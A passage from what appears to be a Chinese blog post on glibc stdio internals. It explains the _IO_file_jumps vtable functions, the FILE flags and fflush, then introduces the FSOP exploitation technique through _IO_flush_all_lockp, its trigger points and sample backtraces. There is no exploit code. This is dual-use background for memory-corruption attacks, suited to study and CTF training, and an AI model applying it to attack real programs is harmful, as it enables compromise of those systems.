<p>到此为止，IO的所有基本操作就已经算是完成了。当然，操作中还需要一些安全检测，例如判断缓冲区是否存在、<code>malloc</code>是否成功等内容，这里就不再赘述。下面，我以<code>glibc</code>中<code>_IO_file_jumps</code>为例，梳理一下函数操作的意图。</p>
<h1 id="_io_file_jumps-函数操作">✍️<code>_IO_file_jumps</code> 函数操作
</h1><p>说明顺序根据<code>_IO_file_jumps</code>中的操作顺序来，因为里面的互相调用还是挺多的，就不说具体写过程，主要说明操作的意图。</p>
<h2 id="_io_new_file_finish"><code>_IO_new_file_finish</code>
</h2><p>这个看名字就非常简单，是文件结束的操作，所以它的操作如下</p>
<blockquote>
<ol>
<li>清空所有缓冲区</li>
<li>关闭（close）文件</li>
</ol>
</blockquote>
<h2 id="_io_new_file_overflow"><code>_IO_new_file_overflow</code>
</h2><p>这个函数意图比较简单，主要是处理当输出缓冲区用完时，向硬盘写入数据。当然，其实这个函数内部非常复杂，加入了一些检测。例如，如果缓冲区不存在则要<strong>初始化缓冲区</strong>。并且，这个函数的参数中有一个标志位。</p>
<blockquote>
<ol>
<li>如果 <code>ch == EOF</code>，则输出<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>的区间。</li>
<li>如果 <code>ch != EOF</code>，并且<code>f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end</code>，则将缓冲区全部输出。</li>
<li>如果 <code>ch == '\n'</code>，则输出 <code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>加一个换行符。</li>
<li>以上都不满足就返回 ch。</li>
</ol>
</blockquote>
<h2 id="_io_new_file_underflow"><code>_IO_new_file_underflow</code>
</h2><p>这个函数与<code>_IO_new_file_overflow</code>差不多，主要是用于从硬盘中读取数据，每次读取都是<code>_IO_buf_base 至 _IO_buf_end</code>。为了防止硬盘中没有这么多数据，设置<code>_IO_read_end</code>为读取的总数。如果，缓冲区不存在则要<strong>初始化缓冲区</strong>。程序返回<code>_IO_read_ptr</code>指针。</p>
<h2 id="__gi__io_default_uflow_io_default_uflow"><code>__GI__IO_default_uflow</code>（<code>_IO_default_uflow</code>）
</h2><p>这个函数就是调用<code>_IO_new_file_underflow</code>，并简单做了一些检测。</p>
<h2 id="__gi__io_default_pbackfail_io_default_pbackfail"><code>__GI__IO_default_pbackfail</code>（<code>_IO_default_pbackfail</code>）
</h2><p>设置存储的函数，暂不重要。</p>
<h2 id="_io_new_file_xsputn"><code>_IO_new_file_xsputn</code>
</h2><p>这个函数是主要目的是将数据从<code>source</code>放入输出缓冲区。显然，放入过程中还有几种情况。</p>
<blockquote>
<ol>
<li>
<p>如果要写入的数据<strong>小于</strong>剩余的空间<code>_IO_write_ptr - _IO_buf_end</code>，那么就直接将数据写入输出缓冲区即可。</p>
</li>
<li>
<p>如果要写入的数据大于剩余的空间_IO_write_ptr - _IO_buf_end。</p>
<p>(1)先将输出缓冲区填满，再调用<code>_IO_new_file_overflow</code>清空输出缓冲区。</p>
<p>(2)剩余的数据继续调用 <code>_IO_new_file_xsputn</code></p>
</li>
</ol>
</blockquote>
<p>说明：我们平时的输出函数主要就是调用此函数。</p>
<h2 id="__gi__io_file_xsgetn_io_file_xsgetn"><code>__GI__IO_file_xsgetn</code>（<code>_IO_file_xsgetn</code>）
</h2><p>这个函数是主要目的是将数据从输入缓冲区放入<code>target</code>。显然放入过程中还有几种情况。</p>
<blockquote>
<ol>
<li>如果要读取的数据小于剩余的数据<code>_IO_read_ptr - _IO_read_end</code>，那么就直接将数据读取到<code>target</code>即可。</li>
<li>如果要读取的数据大于剩余的数据_IO_read_ptr - _IO_read_end
<ol>
<li>先将输入缓冲区全部数据读出，再调用<code>_IO_new_file_underflow</code>从硬盘读入一块数据。</li>
<li>如果需要读取数据特别多，就调用<code>__GI__IO_file_read</code>从硬盘直接读取数据。</li>
</ol>
</li>
</ol>
</blockquote>
<p>说明：我们平时的输入函数主要就是调用此函数</p>
<h2 id="_io_new_file_seekoff"><code>_IO_new_file_seekoff</code>
</h2><p>设置偏移函数，就是设置我们所说的<code>ptr</code>指针。</p>
<h2 id="_io_default_seekpos"><code>_IO_default_seekpos</code>
</h2><p>就是调用<code>_IO_new_file_seekoff</code>。</p>
<h2 id="_io_new_file_setbuf"><code>_IO_new_file_setbuf</code>
</h2><p>这个函数也比较简单，看名字就知道是设置缓冲区的，作用就是初始化各个缓冲区</p>
<blockquote>
<ol>
<li><code>_IO_write_base = _IO_write_ptr = _IO_write_end = _IO_buf_base</code></li>
<li><code>_IO_read_base = _IO_read_ptr = _IO_read_end = _IO_buf_base</code> （使用 <code>_IO_setg</code> 宏）</li>
</ol>
</blockquote>
<h2 id="_io_new_file_sync"><code>_IO_new_file_sync</code>
</h2><p>同步函数，负责与硬盘和缓冲区之间进行同步。</p>
<h2 id="__gi__io_file_doallocate_io_default_doallocate"><code>__GI__IO_file_doallocate</code>（<code>_IO_default_doallocate</code>）
</h2><p>这个就是申请缓冲区的函数，申请完之后还要把输入、输出缓冲区初始化。</p>
<h2 id="__gi__io_file_read_io_file_read"><code>__GI__IO_file_read</code>（<code>_IO_file_read</code>）
</h2><p>这个是输入的最终函数，它将<code>syscall_read</code>进行了一定的封装。</p>
<h2 id="_io_new_file_write"><code>_IO_new_file_write</code>
</h2><p>这个是输出的最终函数，它将<code>syscall_write</code>进行了一定的封装。</p>
<h2 id="__gi__io_file_seek_io_file_seek"><code>__GI__IO_file_seek</code>（<code>_IO_file_seek</code>）
</h2><p>调用<code>__lseek64</code>。</p>
<h2 id="__gi__io_file_close_io_file_close"><code>__GI__IO_file_close</code>（<code>_IO_file_close</code>）
</h2><p>就和名字一样，关闭文件。</p>
<h2 id="__gi__io_file_stat_io_file_stat"><code>__GI__IO_file_stat</code>（<code>_IO_file_stat</code>）
</h2><p>获取文件描述符的状态。调用<code>__fxstat64</code>。</p>
<h2 id="_io_default_showmanyc"><code>_IO_default_showmanyc</code>
</h2><p>此函数没用，返回-1。</p>
<h2 id="_io_default_imbue"><code>_IO_default_imbue</code>
</h2><p>此函数没用。</p>
<h2 id="其他一些内容">其他一些内容
</h2><h3 id="flag标志位"><strong>flag</strong>标志位
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#define _IO_MAGIC 0xFBAD0000 </span><span class="cm">/* Magic number */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _OLD_STDIO_MAGIC 0xFABC0000 </span><span class="cm">/* Emulate old stdio. */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_MAGIC_MASK 0xFFFF0000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_USER_BUF 1 </span><span class="cm">/* User owns buffer; don&#39;t delete it on close. */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_UNBUFFERED 2
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_NO_READS 4 </span><span class="cm">/* Reading not allowed */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_NO_WRITES 8 </span><span class="cm">/* Writing not allowd */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_EOF_SEEN 0x10
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_ERR_SEEN 0x20
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_DELETE_DONT_CLOSE 0x40 </span><span class="cm">/* Don&#39;t call close(_fileno) on cleanup. */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_LINKED 0x80 </span><span class="cm">/* Set if linked (using _chain) to streambuf::_list_all.*/</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_IN_BACKUP 0x100
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_LINE_BUF 0x200
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_TIED_PUT_GET 0x400 </span><span class="cm">/* Set if put and get pointer logicly tied. */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_CURRENTLY_PUTTING 0x800
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_IS_APPENDING 0x1000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_IS_FILEBUF 0x2000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_BAD_SEEN 0x4000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_USER_LOCK 0x8000
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="flush_io_do_flush"><strong>flush</strong>（<code>_IO_do_flush</code>）
</h3><p>清空缓冲区，将输出缓冲区清空。</p>
<h3 id="缓冲区设置宏">缓冲区设置宏
</h3><p><code>_IO_setg</code> <code>_IO_setp</code> 等等</p>
<h3 id="虚表的初始化">虚表的初始化
</h3><p>我认为这是IO里面最让人头疼的地方，它的初始化形式使用大量宏来操作，为了说明问题，我专门找了一个不常用虚表(<code>wfile</code>)。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_wfile_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_new_file_finish</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">)</span> <span class="n">_IO_wfile_overflow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wfile_underflow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wdefault_uflow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">)</span> <span class="n">_IO_wdefault_pbackfail</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_wfile_xsputn</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_wfile_seekoff</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">)</span> <span class="n">_IO_wfile_sync</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_wfile_doallocate</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_wfile_jumps</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中，带<code>default</code>的都是共用的函数，大都在<code>genops.c</code>里面；<code>new_file</code>和<code>file</code>的大都在<code>fileops.c</code>里面；<code>wdefault</code>是宽字符共用的函数，大都在<code>wgenops.c</code>里面；只有<code>wfile</code>的才是自己单独定义的函数，在<code>wfileops.c</code>里面。从上面可以看出<code>wfile</code>单独定义的操作只有5个。</p>
<h3 id="全部清空函数fflush">全部清空函数（<code>fflush</code>）
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp"># define fflush(s) _IO_fflush (s)  </span><span class="c1">//  /assert/assert.c
</span></span></span><span class="line"><span class="cl"><span class="c1">//  /libio/iofflush.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">_IO_fflush</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_IO_flush_all</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="nf">_IO_SYNC</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">?</span> <span class="nl">EOF</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_fflush</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>可以看出 <code>fflush</code>函数在参数为空时，清空(<code>_IO_flush_all_lockp =&gt; _IO_OVERFLOW</code>)全部文件；不为空时，同步(<code>sync</code>)指定文件，两种情况执行步骤不同。</strong></p>
<h3 id="fsop">FSOP
</h3><p>FSOP执行是靠<code>_IO_flush_all_lockp</code>，该函数的功能是刷新所有FILE结构体的输出缓冲区，执行这个程序的时候会沿着<code>fp-&gt;chain</code>执行<code>overflow</code>程序。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">last_stamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>       <span class="o">||</span> <span class="p">(</span><span class="nf">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">           <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>       <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nf">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>   <span class="c1">// 如果输出缓冲区有数据，刷新输出缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">fp</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_chain</span><span class="p">;</span> <span class="c1">//遍历链表
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>_IO_flush_all_lockp</code>调用函数的时机包括：</p>
<blockquote>
<ul>
<li>执行<code>abort</code>函数时。（2.27之后不再刷新）</li>
<li><code>__malloc_assert</code>（仅刷新 <code>stderr</code> ，2.36后不再刷新）</li>
<li>执行<code>exit</code>函数时。</li>
<li>从<code>main</code>函数返回时。（也是执行<code>exit</code>）</li>
</ul>
</blockquote>
<p>首先是<code>abort</code>函数的流程，利用的<code>double free</code>漏洞触发，栈回溯为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="n">do_lock</span><span class="o">=</span><span class="n">do_lock</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mh">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">__GI_abort</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">__libc_message</span> <span class="p">(</span><span class="n">do_abort</span><span class="o">=</span><span class="n">do_abort</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mh">0x2</span><span class="p">,</span> <span class="n">fmt</span><span class="o">=</span><span class="n">fmt</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mh">0x7ffff7ba0d58</span> <span class="s">&#34;*** Error in `%s&#39;: %s: 0x%s ***</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">malloc_printerr</span> <span class="p">(</span><span class="n">action</span><span class="o">=</span><span class="mh">0x3</span><span class="p">,</span> <span class="n">str</span><span class="o">=</span><span class="mh">0x7ffff7ba0e90</span> <span class="s">&#34;double free or corruption (top)&#34;</span><span class="p">,</span> <span class="n">ptr</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">ar_ptr</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">_int_free</span> <span class="p">(</span><span class="n">av</span><span class="o">=</span><span class="mh">0x7ffff7dd4b20</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">p</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span><span class="n">have_lock</span><span class="o">=</span><span class="mh">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">main</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">__libc_start_main</span> <span class="p">(</span><span class="n">main</span><span class="o">=</span><span class="mh">0x400566</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">argc</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span> <span class="n">argv</span><span class="o">=</span><span class="mh">0x7fffffffe578</span><span class="p">,</span> <span class="n">init</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">fini</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">rtld_fini</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">stack_end</span><span class="o">=</span><span class="mh">0x7fffffffe568</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">_start</span> <span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>exit 函数，栈回溯为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="n">do_lock</span><span class="o">=</span><span class="n">do_lock</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mh">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_cleanup</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">__run_exit_handlers</span> <span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span> <span class="n">listp</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">run_list_atexit</span><span class="o">=</span><span class="n">run_list_atexit</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mh">0x1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">__GI_exit</span> <span class="p">(</span><span class="n">status</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">main</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">__libc_start_main</span> <span class="p">(</span><span class="n">main</span><span class="o">=</span><span class="mh">0x400566</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">argc</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span> <span class="n">argv</span><span class="o">=</span><span class="mh">0x7fffffffe578</span><span class="p">,</span> <span class="n">init</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">fini</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">rtld_fini</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">stack_end</span><span class="o">=</span><span class="mh">0x7fffffffe568</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">_start</span> <span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>程序正常退出，栈回溯为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
